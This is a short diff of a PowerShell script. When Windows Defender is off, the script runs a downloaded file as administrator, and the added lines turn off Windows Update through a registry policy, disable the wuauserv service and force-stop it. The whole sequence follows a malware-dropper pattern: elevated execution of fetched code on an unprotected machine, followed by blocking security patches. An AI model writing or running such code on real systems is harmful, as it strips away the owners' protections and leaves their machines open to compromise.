@@ -14,5 +14,22 @@ if ($DefenderStatus -eq $false) {
 
     # Run the downloaded application as administrator
     Start-Process -FilePath $downloadPath -Verb RunAs
+    Write-Host "Windows Update is Disabling..."
+    # Disable Windows Update service using Group Policy
+    $groupPolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
+    $groupPolicyValueName = "DisableWindowsUpdateAccess"
+    $groupPolicyValue = 1
+
+    if (!(Test-Path $groupPolicyPath)) {
+        New-Item -Path $groupPolicyPath -Force | Out-Null
+    }
+
+    Set-ItemProperty -Path $groupPolicyPath -Name $groupPolicyValueName -Value $groupPolicyValue
+
+    # Set Windows Update service startup type to disabled
+    Set-Service -Name "wuauserv" -StartupType Disabled
+
+    # Stop the Windows Update service
+    Stop-Service -Name "wuauserv" -Force
 
 }
